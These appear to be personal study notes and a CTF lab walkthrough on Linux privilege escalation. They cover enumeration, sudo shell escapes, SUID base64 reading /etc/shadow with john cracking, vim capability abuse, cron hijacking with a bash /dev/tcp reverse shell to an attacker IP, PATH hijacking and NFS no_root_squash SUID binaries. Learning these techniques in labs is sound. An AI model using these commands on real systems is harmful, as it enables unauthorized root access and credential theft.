# Linux Privilege Escalation

At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

## Enumeration

Enumeration is the first step to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. Penetration testing engagements, unlike CTF machines, don't end once you gain access to a specific system or user privilege level. As you will see, enumeration is as important during the post-compromise phase as it is before.

#### hostname

The hostname command will return the hostname of the target machine. Although htis value can easily be changed or have a relatively meaningless string (e.g. Linux-908080), in some cases, it can provide information about the target system's role within the corporate network (e.g. SQL-PROD-01 for a production SQL server) ```$hostname -A``` may provide more information.

#### uname -a

It will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

#### /proc/version

The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal. Looking at ```/proc/version``` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

#### /etc/issue

Systems can also be identified by looking at the /etc/issue file. This file usually contains some information about the operating system but can easily be customized or changed. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always a good practice to look at all of these.

#### ps command

The ps command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell. 

The output of the ps (Process Status) will show the following.

- PID: The process ID (unique to the process)
- TTY: Terminal type used by the user
- Time: Amount of CPU time used by the process (this is NOT the time this process has beed running for)
- CMD: The command or executable running (will NOT display any command line parameter)

The **ps** command provides a few useful options

- ps -A : View all running process
- ps axjf: View process tree
- ps aux: The aux option will show process for all users (a), display the user that launched the process(u), and show processes that are not attached to a terminal (x).

#### env

The env command will show environmental variables. The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

#### sudo -l

The target system may be configured to allow users to run some (or all) commands with root privileges. The sudo -l command can be used to list all commands your user can run using sudo.

#### ls

One of the common commands used in linux is probably ls. While looking for potential privilege escalation vectors, please remember to always use the ls command with -la parameter so that it will list all the files and folders including hidden ones.

#### id

The id command will provide a general overview of teh user's privilege level and group memberships. id command can also be used to obtained the same information for another user.

The command can be like ```$id user_name```

#### /etc/passwd

Reading the /etc/passwd file can be an easy way to discover users on the system. While the output can be long and a bit intimidating, it can be easily cut and converted to a useful list for brute-force attacks ```$cat /etc/passwd | grep home | cut -d ":" -f 1```

#### history

Looking at earlier commands with the history command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

#### ifconfig

The target system may be a pivoting point to another network. The ifconfig command will give us information about the network interfaces of the system. 

#### ip route 

ip route command will give us the information to see which network routes exist in the system.

#### netstat

The netstat command can be used with several different options to gather information on existing connections

- netstat -a: shows all listening ports and established connections
- netstat -at or netstat -au : can also be used to list TCP or UDP protocols respectively.
- netstat -l: list ports in listening mode. These ports are open and ready to accept incoming connections. 
- netstat -tp: list connections with the service name and PID information.
- netstat -i: shows interface statistics.
- netstat -ano: 
    - -a: display all sockets
    - -n: Do not resolve names
    - -o: Display timers

#### find

Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in find command is useful and worth keeping in your arsenal.

Some useful examples of find:
```bash
$find . -name flag1.txt: find the finle named flag1.txt in the current directory
$find /home -name flag1.txt: find the file names flag1.txt in the /home directory
$find / -type d -name config: find the directory named config under /
$find / -type f -perm 0777: find files with 777 permissions (files readable, writable, and executable by all users)
$find / -perm a=x: find executable files
$find /home -user frank: find all files of user frank under /home
$find / -mtime 10: find files that were modified in the last 10 days
$find / -atime 10: find files that were accessed in the last 10 days
$find / -cmin -60: find files accesses within the last hour
$find / -size 50M: find files with a 50MB size
$find / -writable -type d 2>/dev/null: find world-writeable folders
$find / -perm 222 -type d 2>/dev/null: find world-writeable folders
$find / -perm -o w -type d 2>/dev/null: find world-writable folders
$find / -perm -o x -type d 2>/dev/null: find world-executable folders
```
Find development tools and supported languages:

- find / -name perl*
- find / -name python*
- find / -name gcc*

- find / -perm -u=s -type f 2>/dev/null: find files with SUID bit, which allows us to run the file with a higher privilege level than the current user.

## Automated Enumeration Tools

- **LinPeas:** [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/linEnum](https://github.com/rebootuser/linEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

## Privilege Escalation through kernel exploits

The kernel exploit methodology is simple;

1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the expoit

Although it looks simple, please remember that a failed kernel expoit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel expoit.


### Research sources

1. Based on your findings, you can use Google to search for an existing expoit code.
2. Sources such as [cvedetails](https://www.cvedetails.com/) can also be useful.
3. Another alternative would be to use a script like LES (Linux Expoit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

## sudo -l and sudo privilege

Any user can check its current situation related to root privileges using the ```sudo -l``` command

We have sudo without password permission in find, less, and nano binaries so let's use all of them one by one to escalate our privilege.

1. Using find
    - We can use ```$sudo find . -exec /bin/bash \; -quit``` to get a root shell
2. Using less
    - first we need to run less with any file known to us with ```$sudo less filename``` then break out of the less to spawn a shell with ```!/bin/sh, !/bin/bash, !/bin/zsh``` and voila we will get the desired shell with root.
3. Using nano
   - We can use ```sudo nano``` to first run nano with superuser privilege then
   - We can use ```^R^X``` to get to the nano command mode
   - After that we can use the command ```reset; sh 1>&0 2>&0``` to spawn a root shell inside nano.

## Privilege escalation using SUID

**SUID:** Set-User Identification
**SGID:** Set-Group Identification
  
To find the files with SUID or SGID permissions we can use ```find / -type f -perm -04000 -ls 2>/dev/null``` 

It will give all the files and binaries that have SUID or SGID bits set.

A great resource is [Hacking Articles](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)

For task 1 we can just read the /etc/passwd file and find that the comic book writer user name is gerryconway. Then to break user2 password we need to read shadow file but we don't have permission to do so. Now we explore for any program that has suid or sgid bit set to it with the command ```$find / -type f -perm -04000 -ls 2>/dev/null``` from there we find that we have base64 with suid set to it. So, we can use base64 to read the shadow file as follows ```$base64 /etc/shadow | base64 -d``` and we will get the content of the shadow file. From the shadow file we take the password hash of user2 and save it to a file named u2pass.hash. Now we can use john to break the hash for us using ```$john u2pass.hash --wordlist=/usr/share/wordlists/rockyou.txt``` and voila we got the password for user2. In task3 we need to read the flag3.txt file, first we need to file the flag3.txt file in the system we can use ```$find / -name flag3.txt 2>/dev/null``` to find the file location then we used base64 to read the file as it is in other user's home directory and our current user doesn't have the permission to read it with the command ```$base64 /home/ubuntu/flag3.txt | base64 -d``` and we got our flag.

## Privilege escalation using Capabilities

Another method system administrators can use to increase the privilege level of a process or binary is "Capabilities". Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.

We can use the ```getcap``` tool to list enabled capabilities.

```bash
$getcap -r / 2>/dev/null
```

We can see that there are 2 binaries vim and view are available with capabilities and we can exploit them with the command as 

```bash
$./vim -c ':python3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

And for view

```bash
$view -c ':python3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

## Privilege Escalation with cron jobs

Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.

The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

Cron job configurations are stored as crontabs (Cron tables) to see the next time and date the task will run. Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you cna expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.

Any user can read the file keeping system-wide cron jobs under ```/etc/crontab```

```
* * * * * root antivirus.sh
```
means the script antivirus.sh script will run every min. We can see that there are 2 script files we can use in our favor. (i.e. backup.sh and antivirus.sh) In any of the files we need to add a line to be able to get a reverse shell to the system with the command

```bash
bash -i >& /dev/tcp/your_ip/port 0>&1
```
You must check if the file has execute permission enabled or not. In our case the backup.sh doesn't have execute permission so we need to add the execute permission to it by running the command.

```bash
$chmod +x backup.sh
```

Now we get the reverse shell to the system and the user is root.

## Privilege Escalation using PATH

If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file)

First explore these
1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulmerability?

We will try to use this code below

```c
#include<unistd.h>
void main() 
{
    setuid(0);
    setgid(0);
    system("thm");
}
```

So let us first find the writable directories for us we can use the command below

```bash
$find / -writable 2>/dev/null
```

This will output a lot of lines which is very hard to read and get a hang of it. So, we need to cut it and then sort with unique 

```bash
$find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
```

We have seen that we have a home dir to write to let us grep it.

```bash
$find / -writable 2>/dev/null | grep home | sort -u
```
We have write access to an unusual home directory lets switch to that one. And we can see that we have 2 files there one is test and the other one is thm.py from thm.py we can see that it calls thm binary as said in the walkthrough so we need to create a bin with name thm we can simply do that by

```bash
$echo "/bin/bash" > thm
$chmod +x thm
```

Now if we run ```./test``` we get the root shell.

## Privilege escalation with NFS

Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase current usre's privilege level.

Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.

NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

```bash
$cat /etc/exports
```

One of the outputlines is /backups *(rw,sync,insecure,no_root_squash,no_subrree_check) The critical element for this privilege escalation vector is the "no_root_squash" option you can see here. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the "no_root_squash" option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

To enumerate mountable shares from our attacking machine we can use

```bash
$showmount -e target_ip
```

We will mount one of the "no_root_squash" shares to our machine and start building our executable.
```bash
$mkdir /tmp/norootsquashmount
$mount -o rw target_ip:/backups /tmp/norootsquashmount
```

We will use the c program 

```c
int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

```bash
#gcc nfs.c -o nfs -w
#chmod +s nfs
```

Now back on the target system we can see that both nfs.c and nfs are present
```bash
$./nfs
```

We will have our root shell.

## Capstone Project

Task 1: What is the content of flag1.txt

Task 2: What is the content of flag2.txt

First we need to enumerate the system.

We find that this is a CentOS 7 server with 3.10.0 linux kernel and we couldn't find any easy to exploit kernel vulnerability. Let's read /etc/passwd file. 

```bash
$cat /etc/passwd | grep home
```
We found 1 other user. So try to read the shadow file with ```$sudo cat /etc/shadow``` This user can't run sudo command, so we can't see the shadow file. So, let's try to find any luck with SGID or SUID. 

```bash
$find / -type f -perm -04000 -ls 2>/dev/null
```

We have base64 with suid bit set to it so let's read the shadow file using base64

```bash
$base64 /etc/shadow | base64 -d | grep missy | cut -d ":" -f 2,3 > missy.hash
```
Now break the hash using john. with ```$john missy.hash --wordlist=/usr/share/wordlists/rockyou.txt``` and voila we got the password

Login as missy ```su - missy``` 

Try to find any flag that is present in under missy's access level

```bash
$find / -name flag*.txt 2>/dev/null
```

We got a hit. Now we can read flag1.txt. Now list sudo permission for missy. ```$sudo -l``` we have got that missy can run find with sudo and doesn't require any password. So, let's break into root using find as we have got earlier 

```bash
$sudo find . -exec /bin/bash \; -quit
```